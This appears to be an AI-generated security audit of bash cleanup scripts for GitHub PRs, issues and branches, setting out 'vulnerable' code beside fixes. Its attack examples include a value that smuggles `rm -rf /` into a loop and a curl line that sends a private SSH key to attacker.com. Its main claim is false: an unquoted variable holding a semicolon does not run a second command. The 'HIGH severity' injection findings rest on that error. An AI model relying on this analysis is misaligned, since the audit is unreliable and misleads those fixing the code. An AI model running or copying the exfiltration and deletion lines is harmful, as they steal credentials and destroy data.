# 🔍 Vulnerability Details - Line-by-Line Analysis

## File: `scripts/cleanup_prs.sh`

### Vulnerability #1: Unquoted Variable (Line 19)
```bash
# ❌ VULNERABLE CODE
for pr in 70 71 72 73 74 75 76 77 78 79 80 81 82 88 89 90 92 95 96; do
  gh pr close $pr --comment "..."  # <- UNQUOTED VARIABLE
done
```

**Issue**: Variable `$pr` is not quoted, allowing shell word splitting.

**Attack Scenario**:
```bash
# If someone modifies the script to include:
for pr in 70 71 "72; rm -rf / #" 73; do
  gh pr close $pr  # Shell will execute: gh pr close 72; rm -rf / #
done
```

**Fix**:
```bash
# ✅ SECURE CODE
for pr in 70 71 72 73 74 75 76 77 78 79 80 81 82 88 89 90 92 95 96; do
  if [[ "$pr" =~ ^[0-9]+$ ]]; then  # Validate numeric
    gh pr close "$pr" --comment "..."  # QUOTED
  fi
done
```

---

### Vulnerability #2: No Input Validation (Lines 8-13)

```bash
# ❌ VULNERABLE CODE
gh pr list --state open --draft --json number,title | \
  jq -r '.[] | select(.number != 83) | .number' | \
  while read -r pr_number; do
    gh pr close "$pr_number" --comment "..."  # No validation!
  done
```

**Issue**: Assumes `jq` always returns valid numbers. No validation.

**Attack Scenario**:
- Compromised `gh` CLI returns malicious JSON
- Supply chain attack on `jq`
- Network MITM modifying API responses

**Fix**:
```bash
# ✅ SECURE CODE
gh pr list --state open --draft --json number,title | \
  jq -r '.[] | select(.number != 83) | .number' | \
  while IFS= read -r pr_number; do
    if [[ "$pr_number" =~ ^[0-9]+$ ]]; then  # VALIDATE
      gh pr close "$pr_number" --comment "..."
    else
      echo "⚠️  Invalid PR number: $pr_number" >&2
    fi
  done
```

---

### Vulnerability #3: Silent Error Suppression (Line 12, 19)

```bash
# ❌ VULNERABLE CODE
gh pr close "$pr_number" --comment "..." || true  # Errors ignored!
gh pr close $pr --comment "..." 2>/dev/null || true  # Errors hidden!
```

**Issue**: 
- `|| true` makes errors non-fatal
- `2>/dev/null` hides error messages
- No way to know if operations failed

**Problems**:
1. Authentication failures go unnoticed
2. API errors are hidden
3. Partial failures leave inconsistent state
4. No audit trail of failures

**Fix**:
```bash
# ✅ SECURE CODE
if gh pr close "$pr_number" --comment "..." 2>&1; then
  echo "✅ Closed PR #$pr_number"
  CLOSED_PRS+=("$pr_number")
else
  echo "⚠️  Failed to close PR #$pr_number" >&2
  FAILED_PRS+=("$pr_number")
fi
```

---

## File: `scripts/cleanup_issues.sh`

### Vulnerability #4: Unquoted Variable (Line 10)

```bash
# ❌ VULNERABLE CODE
for issue in 85 93; do
  gh issue close $issue --comment "..."  # UNQUOTED
done
```

**Same issues as Vulnerability #1**

**Fix**:
```bash
# ✅ SECURE CODE
for issue in 85 93; do
  if [[ "$issue" =~ ^[0-9]+$ ]]; then
    gh issue close "$issue" --comment "..."
  fi
done
```

---

### Vulnerability #5: No Input Validation (Line 8-11)

```bash
# ❌ VULNERABLE CODE
for issue in 85 93; do
  gh issue close $issue --comment "..."  # No validation
done
```

**Same issues as Vulnerability #2**

---

## File: `scripts/cleanup_branches.sh`

### Vulnerability #6: Insufficient Branch Name Validation (Line 11-13)

```bash
# ❌ POTENTIALLY VULNERABLE CODE
git branch -vv | grep ': gone]' | awk '{print $1}' | while read -r branch; do
  echo "  Deleting local branch: $branch"
  git branch -D "$branch" 2>/dev/null || true  # What if $branch is malicious?
done
```

**Issue**: While `"$branch"` is quoted, there's no validation of branch name format.

**Potential Issues**:
1. Branch names with spaces or special characters
2. Branch names that look like git options (e.g., `--force`)
3. Deleting protected branches (main, master, develop)

**Fix**:
```bash
# ✅ SECURE CODE
git branch -vv | grep ': gone]' | awk '{print $1}' | while IFS= read -r branch; do
  # Validate branch name format
  if [[ ! "$branch" =~ ^[a-zA-Z0-9/_.-]+$ ]]; then
    echo "⚠️  Invalid branch name: $branch" >&2
    continue
  fi
  
  # Don't delete protected branches
  if [[ "$branch" =~ ^(main|master|develop)$ ]]; then
    echo "⚠️  Skipping protected branch: $branch" >&2
    continue
  fi
  
  git branch -D "$branch" 2>&1 || echo "⚠️  Failed: $branch" >&2
done
```

---

## File: `scripts/run_full_cleanup.sh`

### Vulnerability #7: Race Condition in Backup Creation (Line 27)

```bash
# ⚠️ POTENTIALLY VULNERABLE CODE
git checkout -b "$BACKUP_BRANCH" 2>/dev/null || git checkout "$BACKUP_BRANCH"
```

**Issue**: If two processes run simultaneously:
1. Process A creates `backup-20251221-120000`
2. Process B also tries to create `backup-20251221-120000`
3. Process B falls back to checking out existing branch
4. Both processes think they have a fresh backup

**Impact**: 
- Confused state if both processes modify the branch
- Backup may not contain expected state
- Low likelihood but possible in CI/CD with parallel jobs

**Fix**:
```bash
# ✅ SECURE CODE
if git checkout -b "$BACKUP_BRANCH" 2>&1; then
  echo "✅ Created new backup branch"
  git push origin "$BACKUP_BRANCH" 2>&1 || echo "⚠️  Failed to push backup" >&2
elif git checkout "$BACKUP_BRANCH" 2>&1; then
  echo "⚠️  Backup branch already exists"
else
  echo "❌ Failed to create/checkout backup" >&2
  exit 1
fi
git checkout main 2>&1 || exit 1
```

---

## 🔢 Vulnerability Severity Scoring

### HIGH Severity (CVSS 7.0-9.0)
- **Command Injection** vulnerabilities (#1, #2, #4)
- Direct code execution risk
- Repository manipulation
- Data loss potential

### MEDIUM Severity (CVSS 4.0-6.9)
- **Input Validation** issues (#5)
- **Error Handling** problems (#3)
- **Branch Name Validation** (#6)
- Information disclosure
- Partial failures

### LOW Severity (CVSS 0.1-3.9)
- **Race Conditions** (#7)
- Low probability
- Limited impact

---

## 🎯 Attack Vectors Explained

### 1. Shell Injection via Unquoted Variables

```bash
# Example attack
variable="72; curl http://attacker.com/steal?data=$(cat ~/.ssh/id_rsa) #"
gh pr close $variable  # Executes: gh pr close 72; curl http://...
```

**Prevention**: Always quote variables and validate input.

---

### 2. Supply Chain Attacks

```bash
# If gh or jq are compromised:
gh pr list  # Returns: {"number": "1; malicious_command"}
jq '.[] | .number'  # Outputs: 1; malicious_command
# Script executes it without validation
```

**Prevention**: Validate all external input, even from trusted tools.

---

### 3. API Response Manipulation

```bash
# MITM attack modifies GitHub API response:
{
  "number": "72",
  "title": "\"; rm -rf / #"
}
```

**Prevention**: Input validation and proper quoting.

---

## 📚 Security Best Practices Applied

### 1. Input Validation Function
```bash
validate_number() {
  [[ "$1" =~ ^[0-9]+$ ]] || return 1
}

# Usage
if validate_number "$pr"; then
  gh pr close "$pr"
else
  echo "Invalid input: $pr" >&2
fi
```

### 2. Proper Error Handling
```bash
# ❌ Bad
command || true

# ✅ Good
if ! command 2>&1; then
  echo "Command failed" >&2
  # Log, track, or handle appropriately
fi
```

### 3. Comprehensive Logging
```bash
LOG_FILE="/tmp/cleanup-$(date +%Y%m%d-%H%M%S).log"
exec > >(tee -a "$LOG_FILE")
exec 2>&1
```

### 4. Dry-Run Mode
```bash
DRY_RUN="${DRY_RUN:-false}"

if [[ "$DRY_RUN" == "true" ]]; then
  echo "[DRY-RUN] Would execute: command"
else
  command
fi
```

### 5. User Confirmation
```bash
read -p "Type 'yes' to continue: " -r
if [[ ! $REPLY =~ ^yes$ ]]; then
  echo "Aborted"
  exit 0
fi
```

### 6. Bash Safety Flags
```bash
#!/bin/bash
set -e  # Exit on error
set -u  # Exit on undefined variable
set -o pipefail  # Exit if any pipe command fails
# Short form: set -euo pipefail
```

---

## 🛡️ Defense in Depth

The secure scripts implement multiple layers of security:

1. **Input Validation**: First line of defense
2. **Proper Quoting**: Prevents injection
3. **Error Handling**: Catches failures
4. **Logging**: Audit trail
5. **Dry-Run**: Test before execution
6. **User Confirmation**: Human checkpoint
7. **Backups**: Recovery mechanism
8. **Rate Limiting**: API protection

No single measure is perfect, but together they provide robust security.

---

**Security Agent Analysis**  
Tokyo Roulette Project  
*Vulnerability Research Date: 2025-12-21*
